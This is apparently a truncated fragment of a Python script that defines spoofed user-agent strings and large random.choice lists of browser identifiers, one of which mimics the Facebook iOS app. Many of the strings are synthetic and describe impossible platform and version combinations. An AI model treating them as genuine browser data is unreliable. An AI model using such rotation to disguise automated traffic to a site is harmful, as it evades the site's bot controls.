uas_j7prime = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_9_2; like Mac OS X) AppleWebKit/533.30 (KHTML, like Gecko)  Chrome/55.0.3478.139 Mobile Safari/534.2"
uas_tes = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_9_2; like Mac OS X) AppleWebKit/533.30 (KHTML, like Gecko)  Chrome/55.0.3478.139 Mobile Safari/534.2"
uas_random = random.choice(['Mozilla/5.0 (Windows; Windows NT 6.1; WOW64; en-US) Gecko/20100101 Firefox/47.7','Mozilla/5.0 (Windows NT 10.3; WOW64) AppleWebKit/603.45 (KHTML, like Gecko) Chrome/52.0.3589.302 Safari/600.3 Edge/17.18019','Mozilla/5.0 (Windows; U; Windows NT 6.2;; en-US) AppleWebKit/533.30 (KHTML, like Gecko) Chrome/49.0.2808.160 Safari/534','Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 6.0; Win64; x64 Trident/4.0)','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_0_4) AppleWebKit/535.5 (KHTML, like Gecko) Chrome/53.0.2528.244 Safari/536','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_9_9; en-US) AppleWebKit/535.34 (KHTML, like Gecko) Chrome/54.0.3854.185 Safari/537','Mozilla/5.0 (Windows; Windows NT 10.2; Win64; x64; en-US) AppleWebKit/535.18 (KHTML, like Gecko) Chrome/49.0.1946.221 Safari/602.9 Edge/12.16289','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2_0; en-US) AppleWebKit/600.12 (KHTML, like Gecko) Chrome/54.0.3460.109 Safari/600','Mozilla/5.0 (Android; Android 4.4.4; ALCATEL ONETOUCH 7049A Build/KOT49H) AppleWebKit/600.8 (KHTML, like Gecko)  Chrome/49.0.2063.172 Mobile Safari/602.1','Mozilla/5.0 (Android; Android 5.0.1; SAMSUNG SM-P810 Build/LRX22G) AppleWebKit/602.5 (KHTML, like Gecko)  Chrome/55.0.2384.280 Mobile Safari/600.1','Mozilla/5.0 (Linux; Linux x86_64) Gecko/20100101 Firefox/59.8','Mozilla/5.0 (iPod; CPU iPod OS 10_8_5; like Mac OS X) AppleWebKit/600.10 (KHTML, like Gecko)  Chrome/48.0.3610.195 Mobile Safari/602.2','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.5; Win64; x64 Trident/6.0)','Mozilla/5.0 (Android; Android 4.3.1; HUAWEI G6-L11 Build/HuaweiG6-L11) AppleWebKit/603.37 (KHTML, like Gecko)  Chrome/55.0.2258.323 Mobile Safari/536.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_7; like Mac OS X) AppleWebKit/601.44 (KHTML, like Gecko)  Chrome/54.0.1100.214 Mobile Safari/603.9','Mozilla/5.0 (Linux; Android 5.1; SAMSUNG SM-G935M Build/LMY47X) AppleWebKit/534.17 (KHTML, like Gecko)  Chrome/48.0.2124.194 Mobile Safari/536.2','Mozilla/5.0 (Windows NT 10.4; WOW64) AppleWebKit/601.9 (KHTML, like Gecko) Chrome/52.0.3666.212 Safari/537.2 Edge/10.86250','Mozilla/5.0 (Windows NT 10.5; Win64; x64; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/54.0.2630.285 Safari/534','Mozilla/5.0 (Windows NT 10.0; x64; en-US) Gecko/20100101 Firefox/62.7','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/533.21 (KHTML, like Gecko) Chrome/52.0.2454.102 Safari/537','Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_1; like Mac OS X) AppleWebKit/601.7 (KHTML, like Gecko)  Chrome/47.0.2930.114 Mobile Safari/536.0','Mozilla/5.0 (Windows; U; Windows NT 10.1; Win64; x64) AppleWebKit/535.26 (KHTML, like Gecko) Chrome/50.0.2520.223 Safari/535.2 Edge/13.69676','Mozilla/5.0 (Windows; Windows NT 10.4; x64; en-US) AppleWebKit/537.7 (KHTML, like Gecko) Chrome/48.0.2493.148 Safari/601.8 Edge/8.82807','Mozilla/5.0 (Linux i565 ; en-US) Gecko/20100101 Firefox/46.8','Mozilla/5.0 (U; Linux i655 ) Gecko/20100101 Firefox/65.9','Mozilla/5.0 (Linux; Android 6.0; Nexus 6X Build/MMB29K) AppleWebKit/601.30 (KHTML, like Gecko)  Chrome/55.0.1335.337 Mobile Safari/602.2','Mozilla/5.0 (Android; Android 4.3.1; HTC Xplorer A280s Build/GRJ90) AppleWebKit/533.9 (KHTML, like Gecko)  Chrome/53.0.1323.395 Mobile Safari/535.3','Mozilla/5.0 (iPod; CPU iPod OS 9_5_0; like Mac OS X) AppleWebKit/602.32 (KHTML, like Gecko)  Chrome/51.0.3404.349 Mobile Safari/602.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0_0; en-US) AppleWebKit/603.8 (KHTML, like Gecko) Chrome/54.0.3268.165 Safari/602','Mozilla/5.0 (iPhone; CPU iPhone OS 9_4_8; like Mac OS X) AppleWebKit/537.5 (KHTML, like Gecko)  Chrome/51.0.1322.385 Mobile Safari/600.4','Mozilla/5.0 (iPhone; CPU iPhone OS 9_4_5; like Mac OS X) AppleWebKit/534.13 (KHTML, like Gecko)  Chrome/47.0.1805.392 Mobile Safari/536.0','Mozilla/5.0 (Windows; Windows NT 6.3;; en-US) Gecko/20100101 Firefox/56.9','Mozilla/5.0 (iPad; CPU iPad OS 7_3_3 like Mac OS X) AppleWebKit/600.37 (KHTML, like Gecko)  Chrome/48.0.1142.287 Mobile Safari/600.0','Mozilla/5.0 (Windows; Windows NT 6.3;) AppleWebKit/603.39 (KHTML, like Gecko) Chrome/54.0.1289.249 Safari/534.4 Edge/17.95994','Mozilla/5.0 (U; Linux x86_64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/47.0.3239.342 Safari/534','Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 6.2; x64 Trident/6.0)','Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/533.37 (KHTML, like Gecko) Chrome/51.0.2543.118 Safari/600','Mozilla/5.0 (iPhone; CPU iPhone OS 9_8_8; like Mac OS X) AppleWebKit/537.44 (KHTML, like Gecko)  Chrome/53.0.3242.326 Mobile Safari/601.7','Mozilla/5.0 (Windows NT 10.3;; en-US) AppleWebKit/601.46 (KHTML, like Gecko) Chrome/47.0.1017.103 Safari/602.8 Edge/14.71881','Mozilla/5.0 (Windows; Windows NT 10.4; x64; en-US) Gecko/20100101 Firefox/65.6','Mozilla/5.0 (Windows NT 10.3; x64; en-US) AppleWebKit/536.45 (KHTML, like Gecko) Chrome/54.0.3618.145 Safari/600.2 Edge/15.37905','Mozilla/5.0 (Linux x86_64) Gecko/20100101 Firefox/64.2','Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; en-US Trident/4.0)','Mozilla/5.0 (Windows NT 6.0; x64; en-US) AppleWebKit/533.36 (KHTML, like Gecko) Chrome/53.0.2714.163 Safari/603','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_0; like Mac OS X) AppleWebKit/533.50 (KHTML, like Gecko)  Chrome/50.0.1301.211 Mobile Safari/600.0','Mozilla/5.0 (Windows NT 10.2;) Gecko/20100101 Firefox/54.7','Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925T Build/LRX22G) AppleWebKit/601.4 (KHTML, like Gecko)  Chrome/49.0.1090.209 Mobile Safari/533.7','Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_4; like Mac OS X) AppleWebKit/536.14 (KHTML, like Gecko)  Chrome/49.0.3207.264 Mobile Safari/602.5','Mozilla/5.0 (Windows; U; Windows NT 10.4; Win64; x64; en-US) AppleWebKit/601.24 (KHTML, like Gecko) Chrome/50.0.1195.349 Safari/536.9 Edge/14.24699','Mozilla/5.0 (Linux; U; Android 5.1.1; SM-G928FG Build/LRX22G) AppleWebKit/602.5 (KHTML, like Gecko)  Chrome/48.0.3738.232 Mobile Safari/535.4','Mozilla/5.0 (Windows NT 10.1;; en-US) AppleWebKit/536.38 (KHTML, like Gecko) Chrome/55.0.1814.389 Safari/601.8 Edge/9.55260','Mozilla/5.0 (iPod; CPU iPod OS 7_9_6; like Mac OS X) AppleWebKit/601.35 (KHTML, like Gecko)  Chrome/52.0.2925.271 Mobile Safari/602.9','Mozilla/5.0 (iPhone; CPU iPhone OS 11_8_2; like Mac OS X) AppleWebKit/533.5 (KHTML, like Gecko)  Chrome/53.0.1758.377 Mobile Safari/601.7','Mozilla/5.0 (Linux; U; Linux x86_64; en-US) AppleWebKit/536.39 (KHTML, like Gecko) Chrome/51.0.3398.337 Safari/600','Mozilla/5.0 (Android; Android 7.1.1; LG-H920 Build/NRD90C) AppleWebKit/602.32 (KHTML, like Gecko)  Chrome/54.0.1208.389 Mobile Safari/600.2','Mozilla/5.0 (U; Linux i545 x86_64) AppleWebKit/603.44 (KHTML, like Gecko) Chrome/47.0.1375.245 Safari/537','Mozilla/5.0 (Windows; U; Windows NT 6.1; x64; en-US) Gecko/20130401 Firefox/64.5','Mozilla/5.0 (Linux; Android 4.4; Google Nexus 7 Build/KOT49H) AppleWebKit/603.12 (KHTML, like Gecko)  Chrome/52.0.1751.286 Mobile Safari/533.8','Mozilla/5.0 (Linux i564 x86_64; en-US) Gecko/20100101 Firefox/52.3','Mozilla/5.0 (iPhone; CPU iPhone OS 9_9_7; like Mac OS X) AppleWebKit/603.45 (KHTML, like Gecko)  Chrome/53.0.3307.336 Mobile Safari/535.3','Mozilla/5.0 (Windows; U; Windows NT 6.3; Win64; x64; en-US) AppleWebKit/601.24 (KHTML, like Gecko) Chrome/53.0.1602.357 Safari/533.6 Edge/11.77142','Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.0; x64; en-US Trident/7.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_6_5) Gecko/20100101 Firefox/64.7','Mozilla/5.0 (Windows; Windows NT 10.0; WOW64) AppleWebKit/603.44 (KHTML, like Gecko) Chrome/53.0.1153.209 Safari/536.4 Edge/8.89292','Mozilla/5.0 (Linux; Android 5.1; MOTOROLA MOTO G XT1068 Build/LPH223) AppleWebKit/603.2 (KHTML, like Gecko)  Chrome/48.0.2049.342 Mobile Safari/603.5','Mozilla/5.0 (Linux; U; Android 4.4.1; SM-T531 Build/KOT49H) AppleWebKit/536.32 (KHTML, like Gecko)  Chrome/49.0.3162.131 Mobile Safari/601.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_3_6; like Mac OS X) AppleWebKit/535.8 (KHTML, like Gecko)  Chrome/49.0.2841.282 Mobile Safari/534.0','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0;; en-US Trident/5.0)','Mozilla/5.0 (Linux; Android 6.0.1; HTC One0P8B2 Build/MRA58K) AppleWebKit/533.34 (KHTML, like Gecko)  Chrome/54.0.1177.284 Mobile Safari/601.9','Mozilla/5.0 (Windows NT 6.1; Win64; x64; en-US) Gecko/20100101 Firefox/61.5','Mozilla/5.0 (Windows NT 6.0; x64; en-US) Gecko/20100101 Firefox/63.9','Mozilla/5.0 (iPod; CPU iPod OS 10_8_6; like Mac OS X) AppleWebKit/536.33 (KHTML, like Gecko)  Chrome/51.0.2758.360 Mobile Safari/602.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_8_0) Gecko/20100101 Firefox/67.6','Mozilla/5.0 (iPhone; CPU iPhone OS 9_4_8; like Mac OS X) AppleWebKit/534.29 (KHTML, like Gecko)  Chrome/51.0.2692.385 Mobile Safari/602.7','Mozilla/5.0 (Linux; U; Linux i570 ) AppleWebKit/601.50 (KHTML, like Gecko) Chrome/55.0.1376.172 Safari/603','Mozilla/5.0 (U; Linux x86_64; en-US) Gecko/20100101 Firefox/68.7','Mozilla/5.0 (iPhone; CPU iPhone OS 8_6_0; like Mac OS X) AppleWebKit/600.31 (KHTML, like Gecko)  Chrome/51.0.2861.294 Mobile Safari/536.7','Mozilla/5.0 (Windows; U; Windows NT 6.3; WOW64; en-US) AppleWebKit/536.48 (KHTML, like Gecko) Chrome/55.0.3784.192 Safari/535','Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 6.1; Win64; x64; en-US Trident/4.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_9_6; en-US) Gecko/20130401 Firefox/73.8','Mozilla/5.0 (Linux i545 x86_64) AppleWebKit/603.49 (KHTML, like Gecko) Chrome/55.0.2943.114 Safari/537','Mozilla/5.0 (Linux; Android 5.1.1; SM-G9358 Build/MMB29M) AppleWebKit/535.47 (KHTML, like Gecko)  Chrome/54.0.3312.306 Mobile Safari/537.3','Mozilla/5.0 (Windows; Windows NT 10.2;) AppleWebKit/601.17 (KHTML, like Gecko) Chrome/52.0.1045.144 Safari/601.2 Edge/13.29510','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_6; like Mac OS X) AppleWebKit/533.13 (KHTML, like Gecko)  Chrome/48.0.1740.151 Mobile Safari/537.5','Mozilla/5.0 (Windows; Windows NT 10.5; WOW64; en-US) AppleWebKit/600.21 (KHTML, like Gecko) Chrome/55.0.3214.320 Safari/533.0 Edge/9.69327','Mozilla/5.0 (Windows; Windows NT 10.3; Win64; x64; en-US) Gecko/20130401 Firefox/58.8','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_7; like Mac OS X) AppleWebKit/536.2 (KHTML, like Gecko)  Chrome/52.0.2699.184 Mobile Safari/601.0','Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.2;; en-US Trident/7.0)','Mozilla/5.0 (Linux; U; Linux x86_64) AppleWebKit/536.31 (KHTML, like Gecko) Chrome/55.0.1155.119 Safari/536','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_6_5) AppleWebKit/600.46 (KHTML, like Gecko) Chrome/54.0.2116.120 Safari/535','Mozilla/5.0 (Linux; U; Android 4.4; SM-E500F Build/KTU84P) AppleWebKit/602.30 (KHTML, like Gecko)  Chrome/49.0.1660.329 Mobile Safari/534.0','Mozilla/5.0 (Windows NT 6.0; WOW64) Gecko/20100101 Firefox/66.9','Mozilla/5.0 (Linux; Android 6.0.1; HTC One_M9 Build/MRA58K) AppleWebKit/533.25 (KHTML, like Gecko)  Chrome/55.0.3451.160 Mobile Safari/600.6','Mozilla/5.0 (Linux i585 x86_64) AppleWebKit/601.18 (KHTML, like Gecko) Chrome/52.0.1759.298 Safari/537','Mozilla/5.0 (Windows; Windows NT 10.4; x64; en-US) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/49.0.1659.309 Safari/535.2 Edge/13.81893','Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; x64; en-US Trident/4.0)','Mozilla/5.0 (Windows; U; Windows NT 6.1; x64) AppleWebKit/601.30 (KHTML, like Gecko) Chrome/51.0.2418.155 Safari/536.6 Edge/15.43216','Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1;; en-US Trident/7.0)','Mozilla/5.0 (Linux x86_64) Gecko/20130401 Firefox/56.1','Mozilla/5.0 (iPhone; CPU iPhone OS 11_8_6; like Mac OS X) AppleWebKit/537.33 (KHTML, like Gecko)  Chrome/54.0.1730.144 Mobile Safari/537.2','Mozilla/5.0 (Linux; Android 7.0; Nexus 7 Build/NPD90G) AppleWebKit/533.10 (KHTML, like Gecko)  Chrome/53.0.2698.261 Mobile Safari/536.6','Mozilla/5.0 (Windows; U; Windows NT 10.1; x64) AppleWebKit/535.16 (KHTML, like Gecko) Chrome/49.0.1567.378 Safari/537','Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.0; Win64; x64; en-US Trident/7.0)','Mozilla/5.0 (Linux; U; Android 5.0; SAMSUNG SM-G925S Build/KOT49H) AppleWebKit/534.11 (KHTML, like Gecko)  Chrome/48.0.3680.138 Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android 7.0; Pixel XL Build/NRD90M) AppleWebKit/600.42 (KHTML, like Gecko)  Chrome/49.0.3784.177 Mobile Safari/601.5','Mozilla/5.0 (Windows; U; Windows NT 10.2; x64) AppleWebKit/536.12 (KHTML, like Gecko) Chrome/53.0.3858.355 Safari/537','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_4_8; en-US) AppleWebKit/535.10 (KHTML, like Gecko) Chrome/54.0.1117.325 Safari/602','Mozilla/5.0 (Linux; Linux i683 x86_64; en-US) AppleWebKit/601.1 (KHTML, like Gecko) Chrome/50.0.2503.153 Safari/534','Mozilla/5.0 (iPhone; CPU iPhone OS 10_8_7; like Mac OS X) AppleWebKit/537.16 (KHTML, like Gecko)  Chrome/53.0.3367.333 Mobile Safari/536.7','Mozilla/5.0 (Windows; U; Windows NT 10.0; WOW64) AppleWebKit/603.35 (KHTML, like Gecko) Chrome/53.0.2094.140 Safari/534.3 Edge/14.23833','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_4_9; en-US) AppleWebKit/602.8 (KHTML, like Gecko) Chrome/48.0.1697.389 Safari/600','Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_4; like Mac OS X) AppleWebKit/602.46 (KHTML, like Gecko)  Chrome/51.0.3630.191 Mobile Safari/601.1','Mozilla/5.0 (Windows; Windows NT 10.1; WOW64; en-US) Gecko/20130401 Firefox/65.0','Mozilla/5.0 (Windows NT 6.3; Win64; x64; en-US) Gecko/20100101 Firefox/59.3','Mozilla/5.0 (U; Linux i586 ) Gecko/20130401 Firefox/60.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_9) Gecko/20100101 Firefox/54.2','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_6; like Mac OS X) AppleWebKit/600.1 (KHTML, like Gecko)  Chrome/51.0.1726.226 Mobile Safari/603.3','Mozilla/5.0 (Windows; Windows NT 10.2; Win64; x64) AppleWebKit/535.18 (KHTML, like Gecko) Chrome/52.0.3181.139 Safari/602.0 Edge/10.64501','Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.0; WOW64; en-US Trident/7.0)','Mozilla/5.0 (Windows; U; Windows NT 10.4; x64) AppleWebKit/603.24 (KHTML, like Gecko) Chrome/53.0.2436.105 Safari/537.4 Edge/13.52265','Mozilla/5.0 (iPod; CPU iPod OS 10_1_0; like Mac OS X) AppleWebKit/535.3 (KHTML, like Gecko)  Chrome/52.0.1282.326 Mobile Safari/537.3','Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.0; Win64; x64; en-US Trident/7.0)','Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.2; x64; en-US Trident/6.0)','Mozilla/5.0 (Linux; Linux i671 x86_64) AppleWebKit/536.9 (KHTML, like Gecko) Chrome/52.0.2531.307 Safari/601','Mozilla/5.0 (Linux; U; Linux i551 ; en-US) Gecko/20130401 Firefox/58.2','Mozilla/5.0 (Windows NT 10.1; Win64; x64; en-US) AppleWebKit/602.4 (KHTML, like Gecko) Chrome/55.0.3902.129 Safari/535.6 Edge/11.51962','Mozilla/5.0 (Windows NT 10.1; Win64; x64; en-US) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; en-US Trident/6.0)','Mozilla/5.0 (Windows; Windows NT 6.1; Win64; x64; en-US) Gecko/20130401 Firefox/68.3','Mozilla/5.0 (Android; Android 7.0; Pixel C Build/NME91E) AppleWebKit/602.27 (KHTML, like Gecko)  Chrome/51.0.2492.274 Mobile Safari/601.8','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_8_1; en-US) Gecko/20100101 Firefox/53.2','Mozilla/5.0 (U; Linux i654 ; en-US) AppleWebKit/533.22 (KHTML, like Gecko) Chrome/52.0.3953.187 Safari/534','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_9_1; en-US) Gecko/20100101 Firefox/61.9','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_8; like Mac OS X) AppleWebKit/537.5 (KHTML, like Gecko)  Chrome/54.0.2988.364 Mobile Safari/600.4','Mozilla/5.0 (Windows; Windows NT 6.1; WOW64) Gecko/20100101 Firefox/66.7','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4_9; en-US) Gecko/20130401 Firefox/73.3','Mozilla/5.0 (Linux; Android 5.0.1; SM-T355 Build/LRX22G) AppleWebKit/534.33 (KHTML, like Gecko)  Chrome/55.0.3999.315 Mobile Safari/537.9','Mozilla/5.0 (Windows NT 10.4; WOW64) AppleWebKit/534.11 (KHTML, like Gecko) Chrome/48.0.3394.313 Safari/601.0 Edge/8.84739','Mozilla/5.0 (Linux; Android 4.4.1; SM-T531 Build/KOT49H) AppleWebKit/601.35 (KHTML, like Gecko)  Chrome/55.0.1123.296 Mobile Safari/601.5','Mozilla/5.0 (Linux; Android 7.0; Pixel XL Build/NRD90M) AppleWebKit/601.40 (KHTML, like Gecko)  Chrome/48.0.2235.102 Mobile Safari/534.5','Mozilla/5.0 (Windows NT 10.1; x64; en-US) AppleWebKit/533.28 (KHTML, like Gecko) Chrome/55.0.3311.204 Safari/533.2 Edge/18.41752','Mozilla/5.0 (iPad; CPU iPad OS 8_8_1 like Mac OS X) AppleWebKit/602.41 (KHTML, like Gecko)  Chrome/55.0.1846.164 Mobile Safari/603.9','Mozilla/5.0 (Windows; Windows NT 10.2; x64) AppleWebKit/600.37 (KHTML, like Gecko) Chrome/48.0.2714.105 Safari/533.6 Edge/10.28949','Mozilla/5.0 (iPhone; CPU iPhone OS 7_4_3; like Mac OS X) AppleWebKit/601.38 (KHTML, like Gecko)  Chrome/53.0.3973.216 Mobile Safari/536.7','Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.0; Trident/4.0)','Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 6.2; Trident/4.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_2; like Mac OS X) AppleWebKit/537.11 (KHTML, like Gecko)  Chrome/47.0.2227.340 Mobile Safari/602.6','Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.0; Trident/7.0)','Mozilla/5.0 (U; Linux x86_64; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/54.0.2140.276 Safari/602','Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.0; Win64; x64; en-US Trident/7.0)','Mozilla/5.0 (Windows NT 10.0; Win64; x64; en-US) AppleWebKit/533.22 (KHTML, like Gecko) Chrome/50.0.2405.276 Safari/536.0 Edge/8.26122','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_5_4) Gecko/20100101 Firefox/49.5','Mozilla/5.0 (iPhone; CPU iPhone OS 7_2_0; like Mac OS X) AppleWebKit/535.24 (KHTML, like Gecko)  Chrome/53.0.3810.191 Mobile Safari/602.6','Mozilla/5.0 (Windows NT 10.4; Win64; x64; en-US) AppleWebKit/602.8 (KHTML, like Gecko) Chrome/53.0.3207.138 Safari/603.3 Edge/9.21683','Mozilla/5.0 (Linux; U; Android 5.0.1; SAMSUNG-SM-N915G Build/LRX22C) AppleWebKit/601.30 (KHTML, like Gecko)  Chrome/52.0.3710.109 Mobile Safari/537.8','Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 6.0; WOW64 Trident/4.0)','Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 10.2; Win64; x64; en-US Trident/4.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_2; like Mac OS X) AppleWebKit/536.23 (KHTML, like Gecko)  Chrome/51.0.3556.217 Mobile Safari/603.5','Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.2; x64; en-US Trident/4.0)','Mozilla/5.0 (Linux; Linux i685 x86_64) Gecko/20100101 Firefox/55.2','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) Gecko/20100101 Firefox/50.9','Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 6.2;; en-US Trident/4.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_5_6) AppleWebKit/603.44 (KHTML, like Gecko) Chrome/48.0.1281.281 Safari/601','Mozilla/5.0 (Windows NT 6.2; x64; en-US) Gecko/20100101 Firefox/74.8','Mozilla/5.0 (Windows; Windows NT 6.3; Win64; x64; en-US) Gecko/20130401 Firefox/53.9','Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.3; Win64; x64; en-US Trident/7.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_3_8; en-US) AppleWebKit/533.34 (KHTML, like Gecko) Chrome/51.0.3285.103 Safari/536','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) Gecko/20130401 Firefox/66.4','Mozilla/5.0 (Linux x86_64; en-US) AppleWebKit/533.31 (KHTML, like Gecko) Chrome/48.0.2936.347 Safari/536','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) Gecko/20100101 Firefox/74.2','Mozilla/5.0 (Linux; U; Android 5.0; LG-D711 Build/LRX22G) AppleWebKit/533.30 (KHTML, like Gecko)  Chrome/50.0.1159.258 Mobile Safari/601.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1_9; en-US) AppleWebKit/534.22 (KHTML, like Gecko) Chrome/50.0.2662.316 Safari/602','Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/601.30 (KHTML, like Gecko) Chrome/48.0.3542.116 Safari/533.4 Edge/15.78849','Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_4; like Mac OS X) AppleWebKit/534.35 (KHTML, like Gecko)  Chrome/51.0.2390.196 Mobile Safari/603.8','Mozilla/5.0 (Windows; U; Windows NT 10.3; WOW64; en-US) AppleWebKit/603.34 (KHTML, like Gecko) Chrome/53.0.2714.228 Safari/535.6 Edge/11.93906'])
uas_nokiac3 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.2; WOW64 Trident/5.0)"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_7; like Mac OS X) AppleWebKit/600.25 (KHTML, like Gecko)  Chrome/51.0.2258.364 Mobile Safari/601.7 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Windows NT 10.3; x64) AppleWebKit/601.9 (KHTML, like Gecko) Chrome/50.0.3007.143 Safari/533"
uas_random2 = random.choice(['Mozilla/5.0 (Linux; U; Linux i584 ) Gecko/20100101 Firefox/57.4','Mozilla/5.0 (Windows; Windows NT 6.3; Win64; x64; en-US) AppleWebKit/536.10 (KHTML, like Gecko) Chrome/47.0.3223.364 Safari/533','Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 6.3;; en-US Trident/4.0)','Mozilla/5.0 (Windows NT 6.0;) AppleWebKit/536.7 (KHTML, like Gecko) Chrome/49.0.2355.251 Safari/535','Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.2; x64 Trident/7.0)','Mozilla/5.0 (Windows; Windows NT 6.2;; en-US) Gecko/20100101 Firefox/50.9','Mozilla/5.0 (Android; Android 7.1; Pixel XL Build/NRD90M) AppleWebKit/536.18 (KHTML, like Gecko)  Chrome/55.0.3864.130 Mobile Safari/533.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_9; like Mac OS X) AppleWebKit/537.8 (KHTML, like Gecko)  Chrome/51.0.1363.394 Mobile Safari/600.3','Mozilla/5.0 (Windows; U; Windows NT 6.3; WOW64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/50.0.2612.375 Safari/535','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_2_4; en-US) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/53.0.3266.275 Safari/603','Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; x64 Trident/4.0)','Mozilla/5.0 (iPad; CPU iPad OS 8_5_3 like Mac OS X) AppleWebKit/602.9 (KHTML, like Gecko)  Chrome/54.0.2218.242 Mobile Safari/600.1','Mozilla/5.0 (Windows; U; Windows NT 6.2;) Gecko/20130401 Firefox/70.4','Mozilla/5.0 (Linux; Android 6.0; Nexus 7P Build/MMB29K) AppleWebKit/534.2 (KHTML, like Gecko)  Chrome/55.0.2037.290 Mobile Safari/535.4','Mozilla/5.0 (Linux; U; Android 7.1; Xperia Build/NDE63X) AppleWebKit/533.33 (KHTML, like Gecko)  Chrome/55.0.2877.275 Mobile Safari/600.0','Mozilla/5.0 (Linux; U; Android 6.0; Nexus 6P Build/MDB08I) AppleWebKit/600.48 (KHTML, like Gecko)  Chrome/55.0.1180.221 Mobile Safari/537.3','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_2_9) AppleWebKit/600.14 (KHTML, like Gecko) Chrome/51.0.1859.232 Safari/535','Mozilla/5.0 (Windows NT 10.0; Win64; x64; en-US) AppleWebKit/535.48 (KHTML, like Gecko) Chrome/51.0.3761.162 Safari/536.3 Edge/14.36010','Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_2; like Mac OS X) AppleWebKit/602.47 (KHTML, like Gecko)  Chrome/50.0.2336.211 Mobile Safari/603.5','Mozilla/5.0 (Linux; U; Android 4.3.1; Nokia 3310 Build/IMM76D) AppleWebKit/535.16 (KHTML, like Gecko)  Chrome/50.0.2555.139 Mobile Safari/533.5','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) Gecko/20130401 Firefox/58.7','Mozilla/5.0 (Windows; Windows NT 10.1; WOW64; en-US) AppleWebKit/602.21 (KHTML, like Gecko) Chrome/49.0.1348.309 Safari/536','Mozilla/5.0 (Android; Android 7.1.1; Xperia V Build/NDE63X) AppleWebKit/601.42 (KHTML, like Gecko)  Chrome/49.0.1432.359 Mobile 